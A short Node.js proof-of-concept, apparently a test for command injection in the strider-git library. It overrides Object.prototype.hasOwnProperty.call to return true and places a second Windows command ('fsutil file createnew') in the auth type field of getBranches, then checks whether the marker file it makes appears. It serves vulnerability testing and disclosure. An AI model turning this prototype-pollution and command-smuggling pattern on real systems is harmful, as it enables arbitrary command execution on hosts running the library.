Object.prototype.hasOwnProperty.call = () => true;
const git = require('strider-git/lib');
const fs = require('fs');
const path = './strider-git';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
git.getBranches({
    auth: {
        type: 'ssaas & fsutil file createnew strider-git 0 & ',
        privkey: 'sss'
    },
    url: 'http://sss'
}, '', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});